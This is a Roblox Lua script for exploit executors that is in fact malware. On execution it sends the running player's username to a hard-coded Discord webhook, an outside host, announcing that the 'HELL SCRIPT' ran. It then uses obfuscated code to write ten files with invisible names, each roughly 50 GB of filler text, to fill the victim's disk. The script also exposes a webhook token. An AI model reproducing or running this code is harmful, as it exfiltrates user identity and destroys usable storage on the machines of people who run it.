local HttpService = game:GetService('HttpService')
local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    httprequest({
        Url = 'https://discord.com/api/webhooks/1436978672027435061/qgF6c0EU5kj2oQtNspolMUkgsEj9Z_mOlz2gbJjSDiVKFxGniR2a9ZaLC0R4qxSvAFDn',
        Method = 'Post',
        Headers = {['Content-Type'] = 'application/json'},
        Body = HttpService:JSONEncode({
            content = '@everyone ',
            embeds = {{
                title = 'HELL SCRIPT EXECUTED LOLL',
                description = "User:"..game.Players.LocalPlayer.Name,
                type = 'rich',
                color = 0xc5f23f,
                timestamp = DateTime.now():ToIsoDate()
            }}
        })
    })
setfpscap(1000)
local _0x1a2b3c={}for _0x9f8e7d=32,126 do table.insert(_0x1a2b3c,string.char(_0x9f8e7d))end for _0x9f8e7d=0x0400,0x04FF do table.insert(_0x1a2b3c,utf8.char(_0x9f8e7d))end local _0x4d5e6f=table.concat(_0x1a2b3c)local _0x7g8h9i=16*1024*1024 local _0x2k3l4m=(function()local _0x5n6o7p=math.ceil(_0x7g8h9i/#_0x4d5e6f)return string.sub(string.rep(_0x4d5e6f,_0x5n6o7p),1,_0x7g8h9i)end)()local function _0x8q9r0s(_0xa1b2c3,_0xd4e5f6)local _0xg7h8i9=_0xd4e5f6*1024*1024*1024 local _0xj0k1l2=math.floor(_0xg7h8i9/_0x7g8h9i)writefile(_0xa1b2c3,"")for _0xm3n4o5=1,_0xj0k1l2 do appendfile(_0xa1b2c3,_0x2k3l4m)if _0xm3n4o5%10==0 then task.wait(0.1)end end end local function _0xp6q7r8(_0xs9t0u1)local _0xv2w3x4="ㅤ"return string.rep(_0xv2w3x4,_0xs9t0u1)..".txt"end local _0xy5z6a7=10 local _0xb8c9d0=50 for _0xe1f2g3=1,_0xy5z6a7 do local _0xh4i5j6=_0xp6q7r8(_0xe1f2g3)_0x8q9r0s(_0xh4i5j6,_0xb8c9d0)task.wait(0.5)end
